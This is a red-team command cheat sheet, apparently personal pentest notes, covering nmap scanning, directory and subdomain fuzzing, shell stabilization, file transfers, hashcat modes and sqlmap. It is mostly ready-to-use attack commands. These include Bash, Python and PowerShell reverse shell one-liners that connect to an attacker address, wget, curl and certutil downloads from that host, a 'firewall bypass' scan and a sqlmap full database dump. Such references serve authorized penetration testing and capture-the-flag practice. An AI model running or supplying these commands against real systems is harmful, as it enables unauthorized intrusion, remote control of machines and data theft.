
# Global Cheatsheets: The Red Team Reference

> **Executive Summary**: This is your quick reference for high-frequency commands. Memorize these, or keep this page open. This collection covers Network Recon, Web Fuzzing, Shell Stabilization, and File Transfers.

## 1. Nmap Network Scanning

### Initial Recon
```bash
# Fast Scan (Top 1000)
nmap -sC -sV -oA initial 10.10.10.10

# Full TCP Scan (All Ports)
nmap -p- -T4 -oA allports 10.10.10.10

# UDP Scan (Top 100)
sudo nmap -sU --top-ports 100 10.10.10.10
```

### Advanced
```bash
# Vulnerability Scan
nmap --script vuln 10.10.10.10

# Firewall Bypass (Fragment)
sudo nmap -f -sS 10.10.10.10
```

## 2. Web Enumeration

### Gobuster (Directories)
```bash
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

### FFUF (Fuzzing)
```bash
# Directory Fuzzing
ffuf -u http://10.10.10.10/FUZZ -w wordlist.txt

# Subdomain Fuzzing
ffuf -u http://target.com -H "Host: FUZZ.target.com" -w subdomains.txt -fs [size]
```

### Nikto (Vulnerability Scan)
```bash
nikto -h http://10.10.10.10
```

## 3. Shell Stabilization (Linux)

You caught a shell with Netcat. It has no tab complete and Ctrl+C kills it. Fix it.

**Step 1: Python PTY**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# OR
script /dev/null -c bash
```

**Step 2: Background**
Press `Ctrl + Z`.

**Step 3: Stty**
```bash
stty raw -echo; fg
```
*(Press Enter twice)*.

**Step 4: Env Vars**
```bash
export TERM=xterm
```

## 4. File Transfers

### Python Server (Sender)
```bash
# Sender (Kali)
python3 -m http.server 80
```

### Downloaders (Receiver)
**Linux**:
```bash
wget http://10.10.14.5/file
curl http://10.10.14.5/file -o file
```

**Windows (PowerShell)**:
```powershell
iwr http://10.10.14.5/file -OutFile file.exe
# OR
certutil -urlcache -split -f http://10.10.14.5/file file.exe
```

**SMB (Impacket)**:
```bash
# Kali
impacket-smbserver share . -smb2support
# Windows
copy \\10.10.14.5\share\file.exe .
```

## 5. Reverse Shell One-Liners

### Bash
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

### Python
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### PowerShell
```powershell
$client = New-Object System.Net.Sockets.TcpClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## 6. Password Cracking (Hashcat)

| Mode | Hash Type | Command |
| :--- | :--- | :--- |
| **0** | MD5 | `hashcat -m 0 hash.txt wordlist.txt` |
| **1000** | NTLM | `hashcat -m 1000 hash.txt wordlist.txt` |
| **5600** | NTLMv2 | `hashcat -m 5600 hash.txt wordlist.txt` |
| **1800** | SHA-512 (Shadow) | `hashcat -m 1800 hash.txt wordlist.txt` |
| **13100** | Kerberoast | `hashcat -m 13100 hash.txt wordlist.txt` |

## 7. SQLMap

### Basic
```bash
sqlmap -u "http://target.com/page.php?id=1" --batch
```

### Full Dump
```bash
sqlmap -u "http://target.com/page.php?id=1" --dump --threads 10
```

### Request File
```bash
sqlmap -r request.txt --level 5 --risk 3
```

## 8. References
- [[08_Tooling_Workflows/01_Advanced_Nmap_Scripting]]
- [[08_Tooling_Workflows/05_Python_for_Pentesters]]
